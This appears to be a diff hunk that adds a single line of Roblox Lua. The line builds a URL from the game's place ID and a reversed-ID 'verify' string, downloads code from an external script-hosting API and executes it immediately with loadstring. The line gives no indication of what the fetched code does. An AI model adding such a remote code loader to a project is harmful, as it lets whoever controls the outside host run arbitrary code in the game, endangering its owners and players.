@@ -1,0 +1,1 @@
+local pid = tostring(game.PlaceId) local vrf = string.reverse(pid) .. 'x99' loadstring(game:HttpGet('https://lua-script-hosting-api.vercel.app/api/load/4a393d560d5cb107e53670fe4e94773cd3d9cf62d8296d4846fc4efa1b87d0cd?pid=' .. pid .. '&verify=' .. vrf))()
